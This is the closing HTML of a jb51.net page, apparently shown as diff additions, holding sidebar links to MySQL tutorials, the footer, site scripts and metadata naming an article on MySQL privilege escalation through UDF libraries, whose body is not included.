+                                    <li><a href=https://www.jb51.net/article/36355.htm title="MySQL笔记之数据备份与还原的使用详解" target="_blank">MySQL笔记之数据备份与还原的使用详解</a></li><li><a href=https://www.jb51.net/article/271795.htm title="MySQL实现字段或字符串拼接的三种方式总结" target="_blank">MySQL实现字段或字符串拼接的三种方式总结</a></li><li><a href=https://www.jb51.net/article/206584.htm title="mysql日志系统的简单使用教程" target="_blank">mysql日志系统的简单使用教程</a></li><li><a href=https://www.jb51.net/article/195930.htm title="通过实例判断mysql update是否会锁表" target="_blank">通过实例判断mysql update是否会锁表</a></li><li><a href=https://www.jb51.net/article/263696.htm title="带例子详解Sql中Union和Union ALL的区别" target="_blank">带例子详解Sql中Union和Union ALL的区别</a></li><li><a href=https://www.jb51.net/article/112879.htm title="MySQL插入emoji表情失败问题的解决方法" target="_blank">MySQL插入emoji表情失败问题的解决方法</a></li><li><a href=https://www.jb51.net/article/125898.htm title="史上最简单的MySQL数据备份与还原教程(中)(三十六)" target="_blank">史上最简单的MySQL数据备份与还原教程(中)(三十六)</a></li><li><a href=https://www.jb51.net/article/28260.htm title="定时备份mysql, 定时切割nginx access log的方法" target="_blank">定时备份mysql, 定时切割nginx access log的方法</a></li><li><a href=https://www.jb51.net/article/148532.htm title="8种手动和自动备份MySQL数据库的方法" target="_blank">8种手动和自动备份MySQL数据库的方法</a></li><li><a href=https://www.jb51.net/article/186613.htm title="mysql8.0.20安装与连接navicat的方法及注意事项" target="_blank">mysql8.0.20安装与连接navicat的方法及注意事项</a></li>
+                                </ul>
+                            </div>
+                        </div>
+                        <div class="r300 clearfix mt10">
+                            <span id="idctu1" class="jbTestPos"></span>
+                        </div>
+                        <div class="sidebox bor-blue">
+                            <div class="bor-default pb10">
+                                <h4 class="blue">常用在线小工具</h4>
+                                <ul class="newsListA"><span id="bctools" class="jbTestPos"></span></ul>
+                            </div>
+                        </div>
+                        <div class="r300 clearfix mt10"><span id="idctu2" class="jbTestPos"></span></div>
+                        <div class="mt10 rFixedBox">
+                            <div class="r300 clearfix"><span id="r2gg" class="jbTestPos"></span></div>
+                            <div class="r300 clearfix mt10">
+                                <span id="rbbd" class="jbTestPos"></span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <!--end fr-->
+            </div>
+        </div>
+        <!--share start-->
+        <div id="right-share">
+            <div class="right-share jb-share" id="jb-share">
+                <a class="rshare-weixin" title="">微信</a>
+                <a rel="nofollow" class="rshare-qzone" target="_blank" href="http://tougao.jb51.net/" title="投稿">投稿</a>
+                <a rel="nofollow" class="rshare-sqq" target="_blank" href="https://task.jb51.net/" title="脚本任务">脚本任务</a>
+                <a rel="nofollow" class="rshare-tsina" target="_blank" href="http://tools.jb51.net/" title="在线工具">在线工具</a>
+            </div>
+            <a class="rshare-top" onClick="javascript:;"></a>
+            <div id="weixin-code" class="hide">
+                <div class="popup_weixin_head">
+                    <p>关注微信公众号</p>
+                    <div id="code"><img src="https://img.jbzj.com/skin/2018/images/erwm.jpg" alt="扫一扫" width="100" height="100"></div>
+                </div>
+            </div>
+        </div>
+        <!--share end-->
+        <!-- 目录容器 -->
+        <div class="AutoCatelog">
+            <div class="AutoCatelogLlist" id="CatelogList" style="display:none"></div>
+        </div>
+    </div>
+    <!--end content-->
+    <div id="footer">
+        <div class="footer-bottom">
+            <p>
+                <a rel="nofollow" href="https://www.jb51.net/about.htm" target="_blank">关于我们</a> -
+                <a rel="nofollow" href="https://www.jb51.net/support.htm" target="_blank">广告合作</a> -
+                <a rel="nofollow" href="https://www.jb51.net/linkus.htm" target="_blank">联系我们</a> -
+                <a rel="nofollow" href="https://www.jb51.net/sm.htm" target="_blank">免责声明</a> -
+                <a rel="nofollow" href="https://www.jb51.net/sitemap.htm" target="_blank">网站地图</a> -
+                <a rel="nofollow" href="tencent://message/?uin=461478385&Site=https://www.jb51.net" target="_blank">投诉建议</a> -
+                <a rel="nofollow" href="https://www.jb51.net/up.htm" target="_blank">在线投稿</a>
+            </p>
+            <p>&copy;CopyRight 2006-2023 JB51.Net Inc All Rights Reserved. 脚本之家 版权所有</p>
+        </div>
+    </div>
+    <!--end footer-->
+    <script type="text/javascript">
+        var ourl = "";
+    </script>
+    ﻿<link type="text/css" rel="stylesheet" href="https://www.jb51.net/skin/2019/css/extend.css" />
+<script type="text/javascript" src="https://www.jb51.net/js/extend.js"></script>
+<script type="text/javascript" src='https://icws.jb51.net/good2021/arc2019.js'></script>
+<script type="text/javascript" src='https://cdn.staticfile.org/viewerjs/1.11.2/viewer.min.js'></script>
+<script type="text/javascript">
+if ('undefined' == typeof(window.Viewer)) {
+        document.write(unescape("%3Cscr"+"ipt src='/skin/js/viewer.min.js' type='text/javascript'%3E%3C/scr"+"ipt%3E"));
+    }
+var viewer = new Viewer(getid('content'));
+</script>
+<div id="tongji">
+<script type="text/javascript" src="https://icws.jb51.net/tongji/tongji.js"></script>
+</div>
+    <script type="text/javascript">$(function(){$.get("//www.jb51.net/pl.asp?id=51767");})</script>
+    <script type="application/ld+json">
+        {
+            "@context": "https://ziyuan.baidu.com/contexts/cambrian.jsonld",
+            "@id": "https://www.jb51.net/article/51767.htm",
+            "appid": "1549322409310619",
+            "title": "Linux利用UDF库实现Mysql提权",
+            "description": "根据MySQL函数族的可扩展机制，意味着用户可以自己建立包含有自定义函数的动态库来创建自定义函数，简称udf",
+            "pubDate": "2014-07-02T15:36:09",
+            "upDate": "2014-07-02T15:36:09"
+        }
+
+    </script>
+</body>
+</html>
